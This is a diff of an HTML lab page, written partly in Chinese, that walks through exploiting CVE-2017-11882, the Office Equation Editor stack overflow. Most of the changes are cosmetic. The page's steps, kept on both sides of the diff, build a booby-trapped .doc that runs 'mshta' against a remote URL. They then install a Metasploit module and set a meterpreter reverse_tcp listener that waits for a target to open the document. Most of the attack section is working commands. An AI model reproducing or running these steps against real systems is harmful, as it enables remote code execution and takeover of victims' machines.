@@ -1,30 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-02-15 Wed 22:05 -->
+<!-- 2023-05-28 Sun 00:55 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-11882</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
 
-                     <!--
-                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
-                     -->
-                     <!--
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
-                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
-                     -->
                      <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
                      <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
                      <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
@@ -40,19 +23,19 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org4da951e">Introduction</a>
+<li><a href="#orgc49e291">Introduction</a>
 <ul>
-<li><a href="#orgfcd274c">步骤</a></li>
-<li><a href="#orgd6de167">参考链接</a></li>
+<li><a href="#org1646bd2">步骤</a></li>
+<li><a href="#org31dd580">参考链接</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </nav>
 
-<div id="outline-container-org4da951e" class="outline-2">
-<h2 id="org4da951e">Introduction</h2>
-<div class="outline-text-2" id="text-org4da951e">
+<div id="outline-container-orgc49e291" class="outline-2">
+<h2 id="orgc49e291">Introduction</h2>
+<div class="outline-text-2" id="text-orgc49e291">
 <p>
 CVE-2017-1188 是微软公布的一个远程执行漏洞，通杀目前市面上的所有 office 版本及 Windows 操作系统。该漏洞的成因是 EQNEDT32.EXE 进程在读入包含 MathType 的 ole 数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞。上次出现这么典型的 office 栈溢出漏洞是著名的 CVE-2012-0158。
 </p>
@@ -64,19 +47,19 @@ CVE-2017-1188 是微软公布的一个远程执行漏洞，通杀目前市面上
 </ul>
 </div>
 
-<div id="outline-container-orgfcd274c" class="outline-3">
-<h3 id="orgfcd274c">步骤</h3>
-<div class="outline-text-3" id="text-orgfcd274c">
+<div id="outline-container-org1646bd2" class="outline-3">
+<h3 id="org1646bd2">步骤</h3>
+<div class="outline-text-3" id="text-org1646bd2">
 <ol class="org-ol">
 <li><p>
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">unzip</span> CVE-2017-11882.zip
-<span style="color: #006DAF;">python</span> CVE-2017-11882/cve-2017-11882.py <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"cmd.exe /c calc.exe"</span> <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"calc.doc"</span> <span style="color: #8D8D84; font-style: italic;"># test</span>
-<span style="color: #006DAF;">python</span> CVE-2017-11882/cve-2017-11882.py <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"mshta http://10.20.20.5:8080/path"</span> <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"classTable.doc"</span>
-<span style="color: #006DAF;">cp</span> CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
-<span style="color: #006DAF;">cp</span> CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
+<pre class="src src-bash">unzip CVE-2017-11882.zip
+python CVE-2017-11882/cve-2017-11882.py -c <span style="color: #008000;">"cmd.exe /c calc.exe"</span> -c <span style="color: #008000;">"calc.doc"</span> <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">test</span>
+python CVE-2017-11882/cve-2017-11882.py -c <span style="color: #008000;">"mshta http://10.20.20.5:8080/path"</span> -c <span style="color: #008000;">"classTable.doc"</span>
+cp CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
+cp CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
 </pre>
 </div></li>
 
@@ -84,26 +67,26 @@ Bash
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">reload_all</span>
-<span style="color: #006DAF;">search</span> CVE-2017-11882
-<span style="color: #006DAF;">use</span> exploit/windows/smb/cve_2017_11882
+<pre class="src src-bash">reload_all
+search CVE-2017-11882
+use exploit/windows/smb/cve_2017_11882
 <span style="color: #006FE0;">set</span> payload windows/meterpreter/reverse_tcp
 <span style="color: #006FE0;">set</span> lhost 10.20.20.5
 <span style="color: #006FE0;">set</span> uripath path
-<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
-<span style="color: #8D8D84; font-style: italic;"># wait for target to open the 'classTable.doc' documnet</span>
-<span style="color: #8D8D84; font-style: italic;"># open or edit the 'calc.doc' will open calc.exe in Windows 7</span>
-<span style="color: #8D8D84; font-style: italic;"># but only edit the 'calc.doc' will open calc.exe in Windows 10</span>
-<span style="color: #8D8D84; font-style: italic;"># PS: Windows 10 must close Windows Defender</span>
+run <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">exploit</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">wait for target to open the 'classTable.doc' documnet</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">open or edit the 'calc.doc' will open calc.exe in Windows 7</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">but only edit the 'calc.doc' will open calc.exe in Windows 10</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">PS: Windows 10 must close Windows Defender</span>
 </pre>
 </div></li>
 </ol>
 </div>
 </div>
 
-<div id="outline-container-orgd6de167" class="outline-3">
-<h3 id="orgd6de167">参考链接</h3>
-<div class="outline-text-3" id="text-orgd6de167">
+<div id="outline-container-org31dd580" class="outline-3">
+<h3 id="org31dd580">参考链接</h3>
+<div class="outline-text-3" id="text-org31dd580">
 <p>
 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882">cve.mitre.org</a>
 <a href="https://www.freebuf.com/vuls/154462.html">www.freebuf.com</a>
